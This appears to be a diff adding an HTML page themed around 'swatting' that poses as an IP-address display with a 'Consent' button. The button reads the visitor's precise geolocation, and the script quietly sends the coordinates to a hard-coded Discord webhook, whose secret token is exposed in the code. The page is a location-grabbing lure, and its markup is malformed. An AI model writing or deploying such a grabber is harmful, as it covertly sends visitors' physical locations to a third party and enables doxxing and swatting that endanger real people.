@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<head>
+<title>trisgotabe | Swatted</title>
+<link rel="icon" type="image/x-icon" href="https://cdn-icons-png.flaticon.com/512/5827/5827642.png">
+<link rel="shortcut icon" type="image/png" href="favicon.webp">
+<meta content="Abdul" property="og:title">
+<meta name="og:description" content="here skidd!! - xoms~">
+<meta name="og:image" content="https://cdn.discordapp.com/attachments/1087755535790657628/1094692627011604521/IMG_9187.jpg?size=80">
+<meta property="og:type" content="website
+<meta name="theme-color" content="#00000">
+<meta image="https://media.discordapp.net/attachments/1142938791770853538/1144411573021069312/swat-icon-3.png">
+<link rel="stylesheet" href="css/css-main.css">
+<link rel="stylesheet" href="css/css-style.css">
+<link rel="stylesheet" href="css/css-ff.css">
+<link rel="stylesheet" href="css/css-animation.css">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="main.css" rel="stylesheet">
+</head>
+
+
+
+    <div class="landing">
+        <pre>⠀⠀
+          <img src="https://media.discordapp.net/attachments/994250111737679882/1151702157544919122/a_6e32654da836fa43a81dc9a2e2d1e90e.gif"/>
+            </pre>
+
+
+
+<html>
+<head>
+    <title>Abduls IP</title>
+</head>
+<body>
+    <h1>Your IP Address is:</h1>
+    <p id="ipAddress">Loading...</p>
+
+    <script src="script.js"></script>
+</body>
+<button onclick="getLocation()">Consent</button>
+
+    <p id="demo"></p>
+
+    <script>
+        var x = document.getElementById("demo");
+        var rainbowText = document.getElementById("rainbowText");
+        var colors = ['#FFFFFF']; // White color
+        var currentIndex = 0;
+
+        function changeRainbowText() {
+            rainbowText.style.color = colors[currentIndex];
+            currentIndex = (currentIndex + 1) % colors.length;
+        }
+
+        function changeLocationTextColors() {
+            changeRainbowText();
+        }
+
+        setInterval(changeLocationTextColors, 500); // Change color every 500 milliseconds
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else { 
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function sendToDiscordWebhook(latitude, longitude) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1190917176895488010/bCvdoJkI_7Z2_XFyfqu_nc70JBTAPs7mKoYJGmqKY4uUs-L2D2XzUqtO6qZ5sqzq7zhb'; // Replace with your Discord webhook URL
+            const data = {
+                content: `Latitude: ${latitude}, Longitude: ${longitude}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            });
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude.toFixed(6);
+            var longitude = position.coords.longitude.toFixed(6);
+
+            sendToDiscordWebhook(latitude, longitude);
+
+            x.innerHTML = `Latitude: ${latitude}<br>Longitude: ${longitude}`;
+        }
+    </script>
+    
+</html>
